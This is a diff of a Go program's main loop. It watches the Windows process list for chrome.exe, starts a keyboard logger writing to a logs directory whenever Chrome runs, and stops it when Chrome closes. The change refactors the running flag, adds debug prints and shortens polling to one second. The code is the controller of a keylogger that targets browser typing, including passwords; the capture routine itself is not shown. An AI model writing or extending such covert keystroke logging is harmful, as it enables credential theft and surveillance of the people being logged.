@@ -10,7 +10,7 @@ import (
 )
 
 func main() {
-	var loggerRunning bool = false
+	loggerRunning := false
 	var logsDirectory string = ""
 	if len(os.Args) > 1 {
 		logsDirectory = os.Args[1]
@@ -42,19 +42,18 @@ func main() {
 			log.Fatal(err)
 		}
 		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
+		fmt.Println(chrome)
 		if chrome != nil {
+			fmt.Println(loggerRunning)
 			if !loggerRunning {
-				go keyboardlogger.StartKeyboardLogger(logsDirectory, file)
-				loggerRunning = true
+				go keyboardlogger.StartKeyboardLogger(logsDirectory, file, &loggerRunning)
 			}
 		} else {
 			if loggerRunning {
-				go keyboardlogger.StopKeyboardLogger()
-				loggerRunning = false
-
+				go keyboardlogger.StopKeyboardLogger(&loggerRunning)
 			}
 		}
-		time.Sleep(5 * time.Second)
+		time.Sleep(1 * time.Second)
 	}
 
 }
